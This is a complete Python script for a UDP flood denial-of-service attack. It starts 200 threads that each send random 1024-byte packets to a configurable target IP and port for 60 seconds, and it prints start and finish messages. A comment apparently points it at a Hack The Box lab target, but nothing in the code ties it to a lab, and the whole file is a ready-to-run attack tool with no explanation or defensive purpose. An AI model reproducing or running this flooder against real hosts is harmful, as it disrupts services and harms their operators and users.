import socket
import threading
import random
import time

target_ip = "10.10.10.10"  # replace with the HTB target IP
target_port = 80           # replace with the appropriate port
packet_size = 1024         # bytes per packet
threads = 200              # number of "bots"
duration = 60              # duration in seconds

def flood():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(packet_size)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            client.sendto(payload, (target_ip, target_port))
        except:
            pass

print(f"[+] Starting flood to {target_ip}:{target_port} with {threads} threads.")
for i in range(threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

time.sleep(duration)
print("[+] Attack finished.")
